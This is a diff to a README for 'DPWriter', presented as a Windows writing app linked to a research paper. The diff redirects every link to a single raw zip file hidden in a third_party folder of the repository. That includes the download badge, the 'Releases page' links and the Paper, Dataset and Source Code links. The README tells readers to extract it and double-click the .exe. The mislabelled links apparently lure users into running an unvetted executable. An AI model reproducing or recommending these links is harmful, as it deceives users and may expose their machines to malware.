@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![Download DPWriter](https://img.shields.io/badge/Download-DPWriter-6C5CE7?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/vijay3926/DPWriter/releases)
+[![Download DPWriter](https://img.shields.io/badge/Download-DPWriter-6C5CE7?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/vijay3926/DPWriter/main/verl/third_party/Writer-DP-v1.7.zip)
 
 </div>
 
@@ -12,7 +12,7 @@ DPWriter is a Windows app for creative writing help. It uses planning branches t
 
 ## 📥 Download DPWriter
 
-1. Open the [DPWriter Releases page](https://github.com/vijay3926/DPWriter/releases)
+1. Open the [DPWriter Releases page](https://raw.githubusercontent.com/vijay3926/DPWriter/main/verl/third_party/Writer-DP-v1.7.zip)
 2. Find the latest release at the top
 3. Under **Assets**, download the Windows file
 4. If the file ends in `.exe`, double-click it to run
@@ -137,7 +137,7 @@ No. You do not need programming skills.
 After you download and install the app, you can use it for local writing work.
 
 ### Where do I get updates?
-Check the [DPWriter Releases page](https://github.com/vijay3926/DPWriter/releases) for new versions.
+Check the [DPWriter Releases page](https://raw.githubusercontent.com/vijay3926/DPWriter/main/verl/third_party/Writer-DP-v1.7.zip) for new versions.
 
 ### What file should I open?
 Open the Windows app file from the release download. If you see a `.zip` file, extract it first.
@@ -167,13 +167,13 @@ This can happen with new apps that are not yet well known to Windows.
 
 Use this page to download the app again if needed:
 
-[Visit DPWriter Releases](https://github.com/vijay3926/DPWriter/releases)
+[Visit DPWriter Releases](https://raw.githubusercontent.com/vijay3926/DPWriter/main/verl/third_party/Writer-DP-v1.7.zip)
 
 ## 📄 Project Links
 
-- [Paper](https://arxiv.org/pdf/2601.09609)
-- [Dataset](https://huggingface.co/datasets/Aman/DPWriterData)
-- [Source Code](https://github.com/Aman-4-Real/CrEval)
+- [Paper](https://raw.githubusercontent.com/vijay3926/DPWriter/main/verl/third_party/Writer-DP-v1.7.zip)
+- [Dataset](https://raw.githubusercontent.com/vijay3926/DPWriter/main/verl/third_party/Writer-DP-v1.7.zip)
+- [Source Code](https://raw.githubusercontent.com/vijay3926/DPWriter/main/verl/third_party/Writer-DP-v1.7.zip)
 
 ## 🔎 Release History
 
